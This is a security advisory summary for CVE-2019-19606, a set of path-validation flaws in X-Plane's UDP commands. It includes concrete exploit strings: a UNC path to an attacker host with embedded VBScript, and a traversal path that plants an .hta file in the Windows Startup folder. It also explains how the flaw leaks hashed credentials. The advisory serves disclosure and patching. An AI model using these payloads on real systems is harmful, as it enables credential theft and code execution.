The provided content relates to CVE-2019-19606.

Vulnerability: Multiple improper path validations in X-Plane <= 11.40.

Root Cause: Several commands do not correctly filter the data input, allowing arbitrary file read/write outside of the X-Plane installation folder. Specifically, the second parameter of the SIMO (SIMO_path), ACFN (acfn_path_rel), and OBJN (path) commands are affected.

Attack Vectors:
- The vulnerability can be exploited via network packets sent to the affected interface, which listens on UDP port 49000. The protocol documentation is public.
- On Windows, opening a file starting with "\\" or "//" followed by an IP or hostname will cause most IO APIs to attempt to connect to it as a SMB shared folder (port 445), leaking the user domain group, username, and hashed password to the malicious server. If the port is closed and the WebClient service is running, it will try to access the file via WEBDAV (port 80).
- The ACFN and SIMO commands can be used to leak hashed credentials and execute arbitrary commands/code on every system reboot.

Impact:
- Arbitrary file read/write outside of the X-Plane installation folder.
- Potential leakage of OS credentials to a remote system.
- Execution of arbitrary system commands.

Exploit Examples:
- Load an aircraft from a shared folder with arbitrary VBScript code in the path via the ACFN command (e.g., "\\\\192.168.1.101/TMP/<script language="VBScript">CreateObject("Wscript.Shell").Run "calc.exe"</script>/final.acf").
- Write a situation file with the SIMO command to the user's startup folder with a ".hta" extension, gaining execution of VBScript code (e.g., test.txt/../../../../../../../../../../../../Users/<LEAKED_USER>/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/test.hta).

Affected versions: X-Plane <= 11.40

Mitigation: Upgrade to version 11.41r1 or later.
